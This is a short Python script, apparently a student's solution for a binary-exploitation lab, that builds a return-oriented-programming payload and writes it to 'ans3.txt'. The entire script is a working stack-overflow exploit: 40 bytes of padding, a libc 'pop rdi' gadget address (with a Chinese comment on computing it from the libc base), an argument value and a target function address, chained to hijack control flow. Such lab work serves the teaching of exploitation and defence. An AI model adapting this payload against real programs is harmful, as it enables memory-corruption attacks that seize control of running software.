from struct import pack
padding = b"A"*40
# 填入运行时计算出的 pop rdi gadget 地址：
pop_rdi_addr = pack("<Q", 0x7ffff7d0f78b)   # <-- 运行时 libc 中 pop rdi gadget 地址 (libc_base + 0x2afcc)
val = pack("<Q", 0x72)
func1 = pack("<Q", 0x401216)
payload = padding + pop_rdi_addr + val + func1
with open("ans3.txt","wb") as f:
    f.write(payload)
print("wrote ans3.txt")
